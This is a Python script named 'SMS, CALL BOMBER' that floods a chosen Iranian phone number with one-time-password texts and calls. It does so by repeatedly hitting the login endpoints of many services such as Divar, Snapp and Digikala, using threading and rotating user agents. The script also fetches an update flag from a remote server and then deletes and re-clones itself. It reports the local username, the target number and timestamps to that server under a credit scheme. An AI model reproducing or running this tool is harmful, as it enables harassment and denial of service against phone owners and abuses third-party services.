try: 
     from threading import Thread
     from Api import sms, call
     from time import sleep
     from inspect import getmembers, isfunction 
     from os import system, name
     from colorama import * 
     import random
     import requests
     import datetime
     import jdatetime
     import getpass
     import platform
except:
     from os import system, name
     print("Not install Package . Installing Package . Connect To Internet ")
     sleep(3)
     system("pip install api" or "pip3 install api")
     system("pip install colorama" or "pip3 install colorama")
     system("pip install requests" or "pip3 install requests")
     system("pip install user-agent" or "pip3 install user-agent")
     system("pip install jdatetime" or "pip3 install jdatetime")

def tercls():
    if str(platform.system()) == "Linux":
        system("clear")
    elif str(platform.system()) == "Windows":
        system("cls")

# git auto uptate
gitversion = 2
newv = requests.get("http://sharabiyan-goose.ir/csb/gitv.txt").text
if int(newv) > gitversion:
    input(" The new version is available, press the Enter key to update! ...")
    # print(" Please run the following commands:")
    system("cd ..")
    system("rm -rf csbomber")
    system("git clone https://github.com/ahmad1622/csbomber.git")
    system("cd csbomber")
    system("python bomber.py")
    exit()

#Start
tercls()
print("\n Starting SMS, CALL BOMBER ... ")
sleep(3)
tercls()

print("\n Loading ["+Fore.LIGHTGREEN_EX+""+Fore.RESET+".....................] 0%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"#"+Fore.RESET+"....................] 0%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"##"+Fore.RESET+"...................] 10%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"###"+Fore.RESET+"..................] 10%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"####"+Fore.RESET+".................] 20%");sleep(0.2);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"#####"+Fore.RESET+"................] 20%");sleep(0.2);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"######"+Fore.RESET+"...............] 30%");sleep(0.3);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"#######"+Fore.RESET+"..............] 30%");sleep(0.3);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"########"+Fore.RESET+".............] 40%");sleep(0.4);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"#########"+Fore.RESET+"............] 40%");sleep(0.4);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"##########"+Fore.RESET+"...........] 50%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"###########"+Fore.RESET+"..........] 50%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"############"+Fore.RESET+".........] 60%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"#############"+Fore.RESET+"........] 60%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"##############"+Fore.RESET+".......] 70%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"###############"+Fore.RESET+"......] 70%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"################"+Fore.RESET+".....] 80%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"#################"+Fore.RESET+"....] 80%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"##################"+Fore.RESET+"...] 90%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"###################"+Fore.RESET+"..] 90%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"####################"+Fore.RESET+".] 100%");sleep(0.1);tercls()
print("\n Loading ["+Fore.LIGHTGREEN_EX+"#####################"+Fore.RESET+"] 100%");sleep(0.1);tercls()

print(Fore.CYAN +"\n")
sleep(0.2)
print("  ██████╗ ███╗   ███╗  ██████╗        █████╗   █████╗  ██╗      ██╗")
sleep(0.2)
print(" ██╔════╝ ████╗ ████║ ██╔════╝       ██╔══██╗ ██╔══██╗ ██║      ██║")
sleep(0.2)
print(" ╚█████╗  ██╔████╔██║ ╚█████╗        ██║  ╚═╝ ███████║ ██║      ██║")
sleep(0.2)
print("  ╚═══██╗ ██║╚██╔╝██║  ╚═══██╗  ██╗  ██║  ██╗ ██╔══██║ ██║      ██║")
sleep(0.2)
print(" ██████╔╝ ██║ ╚═╝ ██║ ██████╔╝  ╚█║  ╚█████╔╝ ██║  ██║ ███████╗ ███████╗")
sleep(0.2)
print(" ╚═════╝  ╚═╝     ╚═╝ ╚═════╝    ╚╝   ╚════╝  ╚═╝  ╚═╝ ╚══════╝ ╚══════╝")
sleep(0.2)
print(Fore.MAGENTA +"")
sleep(0.2)
print("        ██████╗   █████╗  ███╗   ███╗ ██████╗  ███████╗ ██████╗")
sleep(0.2)
print("        ██╔══██╗ ██╔══██╗ ████╗ ████║ ██╔══██╗ ██╔════╝ ██╔══██╗")
sleep(0.2)
print("        ██████╦╝ ██║  ██║ ██╔████╔██║ ██████╦╝ █████╗   ██████╔╝")
sleep(0.2)
print("        ██╔══██╗ ██║  ██║ ██║╚██╔╝██║ ██╔══██╗ ██╔══╝   ██╔══██╗")
sleep(0.2)
print("        ██████╦╝ ╚█████╔╝ ██║ ╚═╝ ██║ ██████╦╝ ███████╗ ██║  ██║")
sleep(0.2)
print("        ╚═════╝   ╚════╝  ╚═╝     ╚═╝ ╚═════╝  ╚══════╝ ╚═╝  ╚═╝")
sleep(0.2)
print(Fore.YELLOW +"")
sleep(0.2)
print("            █████╗  ██╗  ██╗ ███╗   ███╗  █████╗  ██████╗")
sleep(0.2)
print("           ██╔══██╗ ██║  ██║ ████╗ ████║ ██╔══██╗ ██╔══██╗")
sleep(0.2)
print("           ███████║ ███████║ ██╔████╔██║ ███████║ ██║  ██║")
sleep(0.2)
print("           ██╔══██║ ██╔══██║ ██║╚██╔╝██║ ██╔══██║ ██║  ██║")
sleep(0.2)
print("           ██║  ██║ ██║  ██║ ██║ ╚═╝ ██║ ██║  ██║ ██████╔╝")
sleep(0.2)
print("           ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚═════╝")
sleep(0.2)
print("\n" + Fore.RESET)
sleep(0.2)
print(Fore.CYAN +  " App Name : SMS, CALL BOMBER | App Version : 2.0.0 | More : 100 Api")
sleep(0.2)
print(Fore.GREEN + " Developed By Ahmad Samad Pour" + Fore.BLACK)
sleep(0.2)
print(Fore.LIGHTYELLOW_EX + " Telegram : @ahmadsp_1384 | GitHub : https://github.com/ahmad1622")
print("\n")

user_id = getpass.getuser().encode('utf-8').hex()
print(Fore.LIGHTGREEN_EX + " Your Account id is: " + str(user_id) + "\n")

getvalres = requests.get('http://sharabiyan-goose.ir/csb/getval.php?ma=' + str(user_id))
getval = getvalres.text
print(Fore.LIGHTGREEN_EX + " Your Account Credit is: " + str(getval) + "\n")

url = 'http://sharabiyan-goose.ir/csb/ua.php?ma=' + str(user_id)
res = requests.get(url)
lic = res.text

SMS_SERVICES = list(i[0] for i in getmembers(sms, isfunction))
CALL_SERVICES = list(i[0] for i in getmembers(call, isfunction))

def bombing(phone, count):
     x = 0
     phone = f"+98{phone[1:]}"
     for j in range(count):

        for k in range(len(SMS_SERVICES)):
            Thread(target=getattr(sms, SMS_SERVICES[k]), args=[phone]).start()
        if (j !=0) and (j % 5) == 0:
            Thread(target=getattr(call, CALL_SERVICES[x]), args=[phone]).start()
            x += 1
            if x > len(CALL_SERVICES) - 1:
            	x = 0
        print(f" Round {j+1} Completed")
        sleep(0.2)
     print(" Finish")
    
def bombing2():
    #Data
     url_basalam = "https://auth.basalam.com/otp-request"
     json_basalam ={"mobile" : "0" +number}

     url_divar= "https://api.divar.ir/v5/auth/authenticate"
     json_divar= {"phone":number}

     url_snapp= "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
     json_snapp= {"cellphone":"+98" + number}

     url_sf= "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=4a2dcc5a-4b65-4b72-a3ab-c6cdcc6e1737&locale=fa"
     json_sf= {"cellphone":"0" + number}

     url_sh= "https://www.sheypoor.com/api/v10.0.0/auth/send"
     json_sh= {"username":"0" + number}

     url_alibaba= "https://ws.alibaba.ir/api/v3/account/mobile/otp"
     json_alibaba= {"phoneNumber":"+98" + number}

     url_cinma= "https://cinematicket.org/api/v1/users/signup"
     json_cinma= {"phone_number":"98" + number}

     url_digikala= "https://api.digikala.com/v1/user/authenticate/"
     json_digikala= {"backUrl":"/","username":"0" + number}

     url_jet= "https://api.digikalajet.ir/user/login-register/"
     json_jet= {"phone":"0" + number}

     url_virgool= "https://virgool.io/api/v1.4/auth/verify"
     json_virgool= {"method":"phone","identifier":"+98" + number}

     url_aparat= "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage"
     json_aparat= {"temp_id":"474674","account":"0","codepass_type":"otp","guid":"3433103F-9DE0-6E66-5829-B02DFE66EEF0" + number}

     url_telewebion= "https://auth.telewebion.com/user/authenticate"
     json_telewebion= {"field":"+98","type":"mobile" + number}

     url_sb= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
     json_sb= {"phoneNumber":"0" + number}

     url_tpsi= "https://api.tapsi.cab/api/v2/user"
     json_tpsi= {"credential":{"phoneNumber":"0","role":"PASSENGER" + number}}
#end url
#heads
     heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]

#end heads
#sent
     k=0
     while range(yy):
         try:
             random_head = random.choice(heads)
             requests.post(url=url_divar,json=json_divar,headers=random_head)

             requests.post(url= url_snapp,json=json_snapp,headers=random_head)

             requests.post(url= url_sf,json=json_sf,headers=random_head)

             requests.post(url= url_sh,json=json_sh,headers=random_head) 

             requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)

             requests.post(url= url_cinma,json=json_cinma,headers=random_head)

             requests.post(url= url_digikala,json=json_digikala,headers=random_head)

             requests.post(url= url_jet,json=json_jet,headers=random_head)

             requests.post(url= url_virgool,json=json_virgool,headers=random_head)

             requests.post(url= url_aparat,json=json_aparat,headers=random_head)

             requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)

             requests.post(url= url_sb,json=json_sb,headers=random_head)

             requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)

             requests.post(url=url_basalam ,json=json_basalam,headers=random_head)   
         except:
             print(f" Round {k+1} Not Send SMS ")
             break
         print(f" Round {k+1} Complte")
         return True

if int(lic) == 0:
    if __name__ == "__main__":
        num = input( Fore.LIGHTBLUE_EX +''' Enter your Number phone (09123456789) : ''')
        while True:
            yy = int(input( Fore.LIGHTBLUE_EX +" Enter the number of rounds of bombing (1 = 94 SMS) : "))
            if yy <= int(getval):
                break
            else:
                print( Fore.LIGHTRED_EX +" Not enough credit, you can send maximum " + str(getval) + " rounds" + Fore.RESET)

        print("\n"+Fore.RESET)

        setvaldata = "ma=" + str(user_id) + "&val=" + str(yy)
        setvalheaders = {'Content-Type': 'application/x-www-form-urlencoded'}
        requests.post("http://sharabiyan-goose.ir/csb/val.php", data=setvaldata, headers=setvalheaders)

        dandt = datetime.datetime.today()
        bmbdate = str(jdatetime.date.fromgregorian(day = dandt.day, month = dandt.month, year = dandt.year))
        bmbtime = str(dandt.hour) + ":" + str(dandt.minute) + ":" + str(dandt.second)
        data = "user=" + str(user_id) + "&num=" + str(num) + "&round=" + str(yy) + "&date=" + bmbdate + "&time=" + bmbtime
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        nhisr = requests.post("http://sharabiyan-goose.ir/csb/newhis.php", data=data, headers=headers)

        system('clear' if name == 'posix' else 'cls')
        print(Fore.LIGHTGREEN_EX + nhisr.text)
        print(" >>> Phone Number:{}\n >>> Rounds: {}\n\n".format(num,yy))
        print(" Starting Bombing 1 ...\n")
        bombing(phone=num,count=yy)
        number= num[1:11]
        sleep(3)
        tercls()
        print(" Starting Bombing 2 ...\n")
        sleep(1)
        tercls()
        print(" >>> Phone Number : " + num)
        print(" >>> Round : "+ str(yy))

        bombing2()
        print(" Complte Sms Bombing ... ")
        print(" Developed By Ahmad Samad Pour")
        print(" Telegram : @ahmadsp_1384 | GitHub : https://github.com/ahmad1622")
else:
    print(Fore.LIGHTRED_EX + " ERROR: You do not have permission to use this script (please ask the administrator to grant you permission).\n ERROR CODE: "+str(lic) + Fore.RESET)

input("\n Press ENTER key to exit ! ...")
print(Fore.LIGHTGREEN_EX + "\n Exiting ..." + Fore.RESET)
sleep(5)
